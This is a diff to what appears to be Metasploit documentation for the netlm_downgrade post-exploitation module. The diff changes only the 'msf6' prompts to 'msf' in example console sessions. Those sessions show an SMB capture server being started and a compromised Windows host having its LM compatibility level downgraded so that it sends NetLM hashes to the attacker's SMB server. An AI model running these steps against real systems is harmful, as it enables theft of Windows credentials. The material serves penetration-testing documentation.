@@ -29,16 +29,16 @@ IP address of SMB server to capture hashes.
 ### Windows 11 Pro 10.0.22000 Build 22000 x64
 
 ```
-msf6 > use auxiliary/server/capture/smb
-msf6 auxiliary(server/capture/smb) > run
+msf > use auxiliary/server/capture/smb
+msf auxiliary(server/capture/smb) > run
 [*] Auxiliary module running as background job 2.
 
 [*] Server is running. Listening on 0.0.0.0:445
 [*] Server started.
-msf6 auxiliary(server/capture/smb) > use post/windows/gather/netlm_downgrade 
-msf6 post(windows/gather/netlm_downgrade) > set session 1
+msf auxiliary(server/capture/smb) > use post/windows/gather/netlm_downgrade 
+msf post(windows/gather/netlm_downgrade) > set session 1
 session => 1
-msf6 post(windows/gather/netlm_downgrade) > run
+msf post(windows/gather/netlm_downgrade) > run
 
 [*] Running module against WINDEV2110EVAL (192.168.200.140)
 [*] NetLM authentication is disabled (LmCompatibilityLevel: nil). Enabling ...
@@ -52,24 +52,24 @@ msf6 post(windows/gather/netlm_downgrade) > run
 [+] SMB server 192.168.200.130 should now have NetLM hashes
 [*] Restoring original LM compatibility level (LmCompatibilityLevel: nil)
 [*] Post module execution completed
-msf6 post(windows/gather/netlm_downgrade) > 
+msf post(windows/gather/netlm_downgrade) > 
 ```
 
 ### Windows Server 2008 SP1 (x64)
 
 ```
-msf6 > use auxiliary/server/capture/smb
-msf6 auxiliary(server/capture/smb) > run
+msf > use auxiliary/server/capture/smb
+msf auxiliary(server/capture/smb) > run
 [*] Auxiliary module running as background job 2.
 
 [*] Server is running. Listening on 0.0.0.0:445
 [*] Server started.
-msf6 auxiliary(server/capture/smb) > use post/windows/gather/netlm_downgrade 
-msf6 post(windows/gather/netlm_downgrade) > set smbhost 192.168.200.130
+msf auxiliary(server/capture/smb) > use post/windows/gather/netlm_downgrade 
+msf post(windows/gather/netlm_downgrade) > set smbhost 192.168.200.130
 smbhost => 192.168.200.130
-msf6 post(windows/gather/netlm_downgrade) > set session 1
+msf post(windows/gather/netlm_downgrade) > set session 1
 session => 1
-msf6 post(windows/gather/netlm_downgrade) > run
+msf post(windows/gather/netlm_downgrade) > run
 
 [*] Running module against WIN-17B09RRRJTG (192.168.200.218)
 [*] NetLM authentication is disabled (LmCompatibilityLevel: 3). Enabling ...
@@ -83,7 +83,7 @@ msf6 post(windows/gather/netlm_downgrade) > run
 [+] SMB server 192.168.200.130 should now have NetLM hashes
 [*] Restoring original LM compatibility level (LmCompatibilityLevel: 3)
 [*] Post module execution completed
-msf6 post(windows/gather/netlm_downgrade) > 
+msf post(windows/gather/netlm_downgrade) > 
 ```
 
 Alternatively, the SMB connection can captured using [Responder](https://github.com/lgandx/Responder):
